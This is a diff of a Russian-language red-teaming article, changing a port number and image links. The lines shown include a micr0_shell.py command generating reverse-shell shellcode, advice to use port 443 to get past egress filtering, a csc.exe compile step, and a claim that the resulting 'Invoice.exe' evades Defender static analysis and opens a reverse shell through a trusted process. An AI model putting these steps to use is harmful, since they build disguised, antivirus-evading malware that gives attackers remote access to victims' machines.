@@ -39,12 +39,12 @@ categories = ["Cybersecurity", "Red Teaming"]
 **Команда:**
 
 ```
-python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
+python3 micr0_shell.py --ip 0.0.0.0 --port 4444 --language c
 ```
 
 - **IP**: `0.0.0.0` (адрес атакующего).
     
-- **Порт**: `443` (используется вместо 4444 для обхода фильтрации исходящего трафика).
+- **Порт**: `4444` (или используйте 443 для обхода фильтрации исходящего трафика).
     
 &nbsp;
 ---
@@ -200,5 +200,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /win32ico
 
 ### Результат
 
-![](image-1.png)
+![alt text](image-3.png)
 Получен файл `Invoice.exe`, который успешно проходит статический анализ Defender, расшифровывает себя в памяти и инициирует обратное соединение (Reverse Shell) через доверенный процесс.
+
+![alt text](image-4.png)
